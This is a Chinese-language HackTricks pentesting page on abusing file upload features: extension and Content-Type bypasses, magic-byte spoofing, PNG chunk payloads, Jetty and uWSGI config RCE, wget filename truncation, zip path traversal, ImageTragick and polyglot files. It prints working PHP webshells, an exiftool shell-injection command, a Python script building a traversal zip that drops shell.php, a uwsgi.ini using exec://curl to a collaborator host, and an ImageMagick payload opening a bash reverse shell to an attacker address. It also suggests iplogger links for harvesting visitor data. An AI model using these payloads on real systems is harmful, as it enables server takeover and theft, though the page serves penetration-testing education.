# 文件上传

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>

* 你在一家 **网络安全公司** 工作吗？你想在 HackTricks 中看到你的 **公司广告**吗？或者你想获得 **PEASS 的最新版本或下载 HackTricks 的 PDF** 吗？查看 [**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家 [**NFTs**](https://opensea.io/collection/the-peass-family) 集合：[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass)，或者在 **Twitter** 上 **关注** 我 [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向** [**hacktricks 仓库**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud 仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交 PR 来分享你的黑客技巧。**

</details>

![](<../../.gitbook/assets/image (638) (3).png>)

**赏金漏洞提示**：**注册** Intigriti，一个由黑客创建的高级 **赏金漏洞平台**！立即加入我们：[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)，开始赚取高达 **$100,000** 的赏金！

{% embed url="https://go.intigriti.com/hacktricks" %}

## 文件上传通用方法

其他有用的扩展名：

* **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._phps_, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
* **在 PHPv8 中工作**: _.php_, _.php4_, _.php5_, _.phtml_, _.module_, _.inc_, _.hphp_, _.ctp_
* **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
* **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
* **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
* **Flash**: _.swf_
* **Perl**: _.pl, .cgi_
* **Erlang Yaws Web Server**: _.yaws_

### 绕过文件扩展名检查

1. 如果适用，**检查**之前的**扩展名**。还可以使用一些**大写字母**进行测试：_pHp, .pHP5, .PhAr ..._
2. _检查在执行扩展名之前**添加一个有效的扩展名**（也使用之前的扩展名）：_
* _file.png.php_
* _file.png.Php5_
3. 尝试在末尾添加**特殊字符**。可以使用 Burp 来**暴力破解**所有**ASCII**和**Unicode**字符。（_注意，您还可以尝试使用**先前提到的扩展名**_）
* _file.php%20_
* _file.php%0a_
* _file.php%00_
* _file.php%0d%0a_
* _file.php/_
* _file.php.\\_
* _file._
* _file.php...._
* _file.pHp5...._
4. 尝试使用技术来绕过保护，欺骗服务器端的**扩展名解析器**，例如**加倍扩展名**或在扩展名之间添加**垃圾**数据（**空字节**）。_您还可以使用**先前的扩展名**来准备更好的有效负载。_
* _file.png.php_
* _file.png.pHp5_
* _file.php#.png_
* _file.php%00.png_
* _file.php\x00.png_
* _file.php%0a.png_
* _file.php%0d%0a.png_
* _file.phpJunk123png_
5. 在之前的检查中添加**另一层扩展名**：
* _file.png.jpg.php_
* _file.php%00.png%00.jpg_
6. 尝试将**执行扩展名放在有效扩展名之前**，并祈祷服务器配置错误。（用于利用 Apache 配置错误，其中以**.php**结尾的任何内容都将执行代码，但不一定以 .php 结尾）：
* _例如：file.php.png_
7. 在**Windows**中使用**NTFS 备用数据流 (ADS)**。在这种情况下，会在禁止的扩展名之后和允许的扩展名之前插入冒号字符 ":"。结果，在服务器上将创建一个**带有禁止的扩展名的空文件**（例如 "file.asax:.jpg"）。稍后可以使用其他技术（例如使用其短文件名）编辑此文件。还可以使用“**::$data**”模式创建非空文件。因此，在此模式之后添加一个点字符也可能有助于绕过进一步的限制（例如“file.asp::$data.”）。
8. 尝试突破文件名限制。有效扩展名被截断，恶意 PHP 代码被保留。AAA<--SNIP-->AAA.php

```
# Linux 最大 255 字节
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # 减去 4 并添加 .png
# 上传文件并检查响应，看它允许多少个字符。假设为 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

# 创建有效载荷
AAA<--SNIP 232 A-->AAA.php.png

### 绕过 Content-Type、魔术数字、压缩和调整大小

* 通过将 Content-Type 头的值设置为：_image/png_、_text/plain_、_application/octet-stream_ 来绕过 Content-Type 检查。
1. Content-Type 字典：[https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt)
* 通过在文件开头添加真实图像的字节（混淆 _file_ 命令）或在元数据中引入 shell 来绕过魔术数字检查：\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` 或者你也可以直接在图像中 **直接引入有效载荷**：\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
* 如果正在向图像添加压缩，例如使用一些标准的 PHP 库（如 [PHP-GD](https://www.php.net/manual/fr/book.image.php)），则前面的技术将无效。但是，您可以使用 **PLTE 块** [**在此处定义的技术**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) 插入一些文本，这些文本将 **在压缩后保留**。
* [**包含代码的 Github**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_plte\_png.php)
* 网页还可以使用 PHP-GD 函数 `imagecopyresized` 或 `imagecopyresampled` 来调整图像大小。然而，您可以使用 **IDAT 块** [**在此处定义的技术**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) 插入一些文本，这些文本将 **在压缩后保留**。
* [**包含代码的 Github**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_idat\_png.php)
* 利用 PHP-GD 函数 `thumbnailImage` 创建一个在图像调整大小后仍然有效的有效载荷的另一种技术。然而，您可以使用 **tEXt 块** [**在此处定义的技术**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) 插入一些文本，这些文本将 **在压缩后保留**。
* [**包含代码的 Github**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_tEXt\_png.php)

### 其他检查技巧

* 查找漏洞以重命名已上传的文件（更改扩展名）。
* 查找 **本地文件包含** 漏洞以执行后门。
* **可能的信息泄露**：
1. **多次**（并且**同时**）上传**相同的文件**，使用**相同的名称**
2. 上传一个具有**已存在的文件**或**文件夹**的**名称**的文件
3. 上传一个文件，其名称为**“.”、“..”或“…”**。例如，在 **Windows** 的 Apache 中，如果应用程序将上传的文件保存在“/www/uploads/”目录中，“.” 文件名将在“/www/”目录中创建一个名为“uploads”的文件。
4. 上传一个可能不容易删除的文件，例如在 **NTFS** 中的 **“…:.jpg”**。（Windows）
5. 使用 **无效字符**（如 `|<>*?”`）在 **Windows** 中上传一个文件。（Windows）
6. 使用 **保留的**（**禁止的**）**名称**在 **Windows** 中上传一个文件，如 CON、PRN、AUX、NUL、COM1、COM2、COM3、COM4、COM5、COM6、COM7、COM8、COM9、LPT1、LPT2、LPT3、LPT4、LPT5、LPT6、LPT7、LPT8 和 LPT9。

* 还可以尝试上传一个可执行文件（.exe）或一个（不太可疑的）.html 文件，当受害者意外打开时将执行代码。

### 特殊扩展名技巧

如果您正在尝试将文件上传到 **PHP 服务器**，[请查看通过 **.htaccess** 技巧执行代码](https://book.hacktricks.xyz/pentesting/pentesting-web/php-tricks-esp#code-execution-via-httaccess)。\
如果您正在尝试将文件上传到 **ASP 服务器**，[请查看通过 **.config** 技巧执行代码](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files)。

`.phar` 文件类似于 Java 的 `.jar` 文件，但用于 PHP，并且可以像 PHP 文件一样使用（使用 php 执行它，或在脚本中包含它...）

`.inc` 扩展名有时用于仅用于导入文件的 php 文件，因此在某些情况下，某人可能已经允许执行此扩展名。

## **Jetty RCE**

如果您可以将 XML 文件上传到 Jetty 服务器，则可以获得 [RCE，因为 **新的 \*.xml 和 \*.war 文件会自动处理**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**。** 因此，如下图所示，将 XML 文件上传到 `$JETTY_BASE/webapps/` 并等待 shell！

![](<../../.gitbook/assets/image (1) (3) (1) (1) (1).png>)

## **uWSGI RCE**

如果您可以替换 [**uWSGI 服务器的 .ini 配置文件，则可以获得 RCE**](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)**。** 实际上，uWSGI 配置文件可以包含使用精确语法定义的“魔法”变量、占位符和运算符。特别是 '@' 运算符以 @(filename) 的形式用于包含文件的内容。支持许多 uWSGI 方案，包括“exec” - 用于从进程的标准输出中读取。当解析 .ini 配置文件时，这些运算符可以被用于远程命令执行或任意文件写入/读取：

恶意 `uwsgi.ini` 文件示例：
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
当解析配置文件时，将执行负载。请注意，要解析配置文件，需要重新启动进程（崩溃？拒绝服务攻击？）或自动重新加载文件（如果发现更改，则可以使用选项指示重新加载文件的秒数）。

重要提示：uWSGI对配置文件的解析是宽松的。先前的负载可以嵌入在二进制文件（例如图像、PDF等）中。

## wget文件上传/SSRF技巧

在某些情况下，您可能会发现服务器正在使用`wget`来下载文件，并且您可以指定URL。在这些情况下，代码可能会检查下载文件的扩展名是否在白名单中，以确保只有允许下载的文件。然而，这个检查可以被绕过。

在Linux中，文件名的最大长度为255个字符，然而，wget将文件名截断为236个字符。您可以下载一个名为"A"\*232+".php"+".gif"的文件，这个文件名将绕过检查（在这个例子中，".gif"是一个有效的扩展名），但是`wget`将把文件重命名为"A"\*232+".php"。
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
请注意，您可能正在考虑的**另一种选择**是绕过此检查的方法是使**HTTP服务器重定向到另一个文件**，因此初始URL将通过检查，然后wget将使用新名称下载重定向的文件。这**不起作用**，**除非**使用**参数**`--trust-server-names`来使用wget，因为**wget将使用原始URL中指定的文件名下载重定向的页面**。

#### 其他资源

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
* [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
* [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
* [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)

## 工具

* [Upload Bypass](https://github.com/sAjibuu/Upload\_Bypass)是一个强大的工具，旨在帮助渗透测试人员和漏洞猎人测试文件上传机制。它利用各种漏洞赏金技术简化了识别和利用漏洞的过程，确保对Web应用程序进行全面评估。

## 从文件上传到其他漏洞

* 将**文件名**设置为`../../../tmp/lol.png`，尝试实现**路径遍历**
* 将**文件名**设置为`sleep(10)-- -.jpg`，可能能够实现**SQL注入**
* 将**文件名**设置为`<svg onload=alert(document.domain)>`，实现XSS
* 将**文件名**设置为`; sleep 10;`，测试一些命令注入（更多[命令注入技巧请参见此处](../command-injection.md)）
* [图像（svg）文件上传中的**XSS**](../xss-cross-site-scripting/#xss-uploading-files-svg)
* **JS**文件**上传** + **XSS** = [滥用**Service Workers**的XSS](../xss-cross-site-scripting/#xss-abusing-service-workers)
* [svg上传中的**XXE**](../xxe-xee-xml-external-entity.md#svg-file-upload)
* [通过上传svg文件实现**开放重定向**](../open-redirect.md#open-redirect-uploading-svg-files)
* 从[**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)中尝试**不同的svg有效负载**
* [著名的**ImageTrick**漏洞](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
* 如果您可以**指示Web服务器从URL中获取图像**，则可以尝试滥用[SSRF](../ssrf-server-side-request-forgery/)。如果此**图像**将被**保存**在某个**公共**站点中，您还可以指示URL来自[https://iplogger.org/invisible/](https://iplogger.org/invisible/)，并**窃取每个访问者的信息**。
* [通过PDF-Adobe上传实现**XXE和CORS**绕过](pdf-upload-xxe-and-cors-bypass.md)
* 特制的PDF文件用于XSS：以下页面介绍了如何**注入PDF数据以执行JS**。如果您可以上传PDF文件，可以根据给定的指示准备一些将执行任意JS的PDF文件。
* 上传\[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt))内容以检查服务器是否有任何**防病毒软件**
* 检查是否有任何上传文件的**大小限制**

以下是您可以通过上传实现的十大事项的排名（来自[链接](https://twitter.com/SalahHasoneh1/status/1281274120395685889)）：

1. **ASP / ASPX / PHP5 / PHP / PHP3**：Webshell / RCE
2. **SVG**：存储型XSS / SSRF / XXE
3. **GIF**：存储型XSS / SSRF
4. **CSV**：CSV注入
5. **XML**：XXE
6. **AVI**：LFI / SSRF
7. **HTML / JS**：HTML注入 / XSS / 开放重定向
8. **PNG / JPEG**：像素洪水攻击（DoS）
9. **ZIP**：通过LFI实现RCE / DoS
10. **PDF / PPTX**：SSRF / BLIND XXE

#### Burp扩展

{% embed url="https://github.com/portswigger/upload-scanner" %}

## 魔术头字节

* **PNG**：`"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["`
* **JPG**：`"\xff\xd8\xff"`

有关其他文件类型，请参考[https://en.wikipedia.org/wiki/List\_of\_file\_signatures](https://en.wikipedia.org/wiki/List\_of\_file\_signatures)。

### 自动解压缩的Zip/Tar文件上传

如果您可以上传将在服务器内部解压缩的ZIP文件，您可以执行以下两个操作：

#### 符号链接

上传包含指向其他文件的符号链接的链接，然后访问解压缩的文件，您将访问链接的文件：
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### 在不同的文件夹中解压缩

解压缩的文件将会被创建在意料之外的文件夹中。

有人可能会认为这种设置可以防止通过恶意文件上传进行操作系统级别的命令执行，但不幸的是，这是不正确的。由于ZIP存档格式支持分层压缩，并且我们还可以引用更高级别的目录，因此我们可以通过滥用目标应用程序的解压缩功能来逃离安全上传目录。

可以在这里找到一个自动化利用程序来创建这种类型的文件：[**https://github.com/ptoomey3/evilarc**](https://github.com/ptoomey3/evilarc)
```python
python2 evilarc.py -h
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
您还可以使用**evilarc的符号链接技巧**，如果标志位于`/flag.txt`中，请确保创建一个**指向该文件的符号链接**并在您的系统中**创建该文件**，这样当您调用evilarc时就不会出错。

一些创建恶意zip文件的Python代码：
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
为了实现远程命令执行，我采取了以下步骤：

1. 创建一个PHP shell：
```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```
1. 使用“文件喷洒”技术创建一个压缩的zip文件：
```
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# ls *.php
simple-backdoor.php  xxAxxAxxAcmd.php        xxAxxAxxAxxAxxAxxAcmd.php        xxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php
xxAcmd.php           xxAxxAxxAxxAcmd.php     xxAxxAxxAxxAxxAxxAxxAcmd.php     xxAxxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php
xxAxxAcmd.php        xxAxxAxxAxxAxxAcmd.php  xxAxxAxxAxxAxxAxxAxxAxxAcmd.php
root@s2crew:/tmp# zip cmd.zip xx*.php
adding: xxAcmd.php (deflated 40%)
adding: xxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
adding: xxAxxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
root@s2crew:/tmp#
```
3. 使用十六进制编辑器或vi，将“xxA”更改为“../”，我使用vi：
```
:set modifiable
:%s/xxA/..\//g
:x!
```
只剩下一步了：上传ZIP文件并让应用程序解压缩它！如果成功并且Web服务器具有足够的权限来写入目录，系统上将会有一个简单的操作系统命令执行shell：

[![b1](https://blog.silentsignal.eu/wp-content/uploads/2014/01/b1-300x106.png)](https://blog.silentsignal.eu/wp-content/uploads/2014/01/b1.png)

**参考**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

## ImageTragic

将此内容以图像扩展名上传以利用此漏洞 **(ImageMagick, 7.0.1-1)**
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## 将PHP Shell嵌入PNG图像

将Web Shell放置在IDAT块中的主要原因是它可以绕过调整大小和重新采样操作 - PHP-GD包含两个函数来实现这一点[imagecopyresized](http://php.net/manual/en/function.imagecopyresized.php)和[imagecopyresampled](http://php.net/manual/en/function.imagecopyresampled.php)。

阅读此文章：[https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## 多语言文件

在安全环境中，多语言文件是指可以作为多种不同文件类型的有效形式的文件。例如，[GIFAR](https://en.wikipedia.org/wiki/Gifar)既是GIF文件又是RAR文件。还有一些文件可以同时是GIF和JS，PPT和JS等。

多语言文件通常用于绕过基于文件类型的保护。许多允许用户上传文件的应用程序只允许上传某些类型的文件，例如JPEG、GIF、DOC，以防止用户上传可能危险的文件，如JS文件、PHP文件或Phar文件。

这有助于上传符合多种不同格式的文件。它可以允许您上传一个同时看起来像JPEG和PHAR文件（PHp ARchive）的文件，但可能仍然需要一个有效的扩展名，如果上传函数不允许，则无法帮助您。

更多信息请参见：[https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Bug赏金提示**：**注册**Intigriti，一个由黑客创建的高级**Bug赏金平台**！立即加入我们：[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)，开始赚取高达**$100,000**的赏金！

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 您在**网络安全公司**工作吗？您想在HackTricks中看到您的公司广告吗？或者您想获得最新版本的PEASS或下载PDF格式的HackTricks吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[NFT](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks衣物**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享您的黑客技巧。**

</details>
